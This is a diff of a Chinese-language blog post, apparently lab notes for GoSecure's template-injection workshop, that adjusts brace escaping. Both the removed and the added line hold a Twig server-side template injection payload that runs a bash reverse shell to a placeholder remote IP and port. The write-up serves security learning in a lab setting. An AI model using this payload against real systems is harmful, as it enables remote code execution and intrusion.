@@ -8,12 +8,12 @@ tags: [ssti,websec]
 ## 环境地址
 gosecure 的ssti教程地址[template-injection-workshop](https://gosecure.github.io/template-injection-workshop/#0)
 
-实际请去掉{\{ 和 {\% 中的\。
+实际请去掉{\\{ 和 {\% 中的\。
 
 
 ## LAB 1: Twig (PHP)
 ```
-email={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("/bin/bash -c \"/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261\"")}}&submit=
+email={\{_self.env.registerUndefinedFilterCallback("exec")}}{\{_self.env.getFilter("/bin/bash -c \"/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261\"")}}&submit=
 ```
 原理可以参考[Twig SSTI](https://github.com/EdOverflow/bugbountywiki/wiki/SSTI)。  
 
